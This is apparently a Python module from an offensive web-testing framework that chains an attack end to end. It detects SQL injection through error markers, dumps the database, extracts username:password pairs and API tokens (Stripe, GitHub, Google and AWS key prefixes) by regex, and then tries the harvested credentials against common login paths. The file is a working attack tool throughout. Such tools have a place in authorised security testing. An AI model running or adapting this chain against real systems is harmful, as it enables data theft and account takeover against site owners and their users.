"""sqli_chain_v2 — SQLi detect → auto-dump → creds → reuse in one flow"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from core.payload_source import get_payloads, detect_waf
import re
import time


ERROR_MARKERS = [
    "sql syntax", "mysql_fetch", "mysqli", "pg_query", "ora-",
    "sqlstate", "unclosed quotation", "quoted string",
    "you have an error in your sql", "warning: mysql",
    "postgresql", "microsoft ole db", "odbc sql",
]

SUCCESS_MARKERS = [
    "welcome", "dashboard", "logout", "sign out",
    "my account", "hello admin", "administrator",
]


class SqliChainV2:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"id": ["1"]}
        http = HttpClient(session, logger)
        waf = detect_waf(session)

        print(f"[sqli_chain] target: {target}")
        print(f"[sqli_chain] params: {list(params.keys())}")
        print(f"[sqli_chain] waf: {waf or 'none'}")
        print()

        # Phase 1: detect
        print("=" * 60)
        print("PHASE 1: DETECT SQLi")
        print("=" * 60)

        payloads = get_payloads("sql", waf=waf, limit=40)
        vuln_params = []

        for name in params:
            print(f"\n[param: {name}]")
            for p in payloads[:30]:
                q = dict(params); q[name] = [p]
                url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
                r = http.get(url)
                if not r:
                    continue
                low = r.text.lower()
                for marker in ERROR_MARKERS:
                    if marker in low:
                        print(f"  + {p[:40]} -> {marker}")
                        vuln_params.append({"param": name, "payload": p, "marker": marker})
                        logger.finding("sqli_chain_detect", "high",
                                       f"{name}={p[:60]} {marker}")
                        break
                if vuln_params and vuln_params[-1]["param"] == name:
                    break

        if not vuln_params:
            print("\n. no SQLi detected")
            return {"vulnerable": False}

        print(f"\n[+] {len(vuln_params)} vulnerable params")

        # Phase 2: dump
        print()
        print("=" * 60)
        print("PHASE 2: DUMP DATA")
        print("=" * 60)

        from core.loader import ModuleLoader
        loader = ModuleLoader()
        dumped_data = {}

        for v in vuln_params[:2]:
            print(f"\n[dump {v['param']}]")
            try:
                m = loader.load("dump", "sqli_dump")
                if m:
                    # temporarily change target query
                    old_target = session.target
                    session.target = target  # already has param
                    m.run(session, logger)
                    session.target = old_target
            except Exception as e:
                print(f"  skip: {type(e).__name__}")

        # Phase 3: extract creds from findings
        print()
        print("=" * 60)
        print("PHASE 3: EXTRACT CREDENTIALS")
        print("=" * 60)

        creds = []
        tokens = []

        for f in session.findings:
            detail = f.get("detail", "")
            # user:pass
            for m in re.findall(r"([a-zA-Z0-9_.\-]{3,30}):([a-zA-Z0-9!@#$%^&*_.\-]{5,30})", detail):
                if m[0] not in ("http", "https", "ftp") and m not in creds:
                    creds.append(m)
            # tokens
            for m in re.findall(r"(?:sk_live|ghp_|AIza|AKIA)[A-Za-z0-9_\-]{10,}", detail):
                if m not in tokens:
                    tokens.append(m)

        print(f"  credentials found: {len(creds)}")
        for user, pw in creds[:5]:
            print(f"    {user}:{pw}")
        print(f"  tokens found: {len(tokens)}")
        for t in tokens[:3]:
            print(f"    {t[:40]}")

        # Phase 4: reuse
        print()
        print("=" * 60)
        print("PHASE 4: CREDENTIAL REUSE")
        print("=" * 60)

        if not creds and not tokens:
            print("  no creds to reuse")
            return {"vulnerable": True, "creds": 0}

        from core.http import HttpClient
        base = f"{u.scheme}://{u.netloc}"

        login_paths = ["/login", "/signin", "/doLogin", "/auth/login",
                       "/api/login", "/admin/login", "/admin"]

        for user, pw in creds[:3]:
            for path in login_paths:
                r = http.post(base + path, data={"username": user, "password": pw})
                if not r:
                    r = http.post(base + path, data={"uid": user, "passw": pw})
                if r and r.status_code == 200:
                    low = r.text.lower()
                    if any(m in low for m in SUCCESS_MARKERS):
                        print(f"  + LOGIN: {user}:{pw} @ {path}")
                        logger.finding("sqli_chain_login", "critical",
                                       f"{user}:{pw} @ {path}")
                        break

        print(f"\n[sqli_chain] done")
        return {"vulnerable": True, "creds": len(creds), "tokens": len(tokens)}
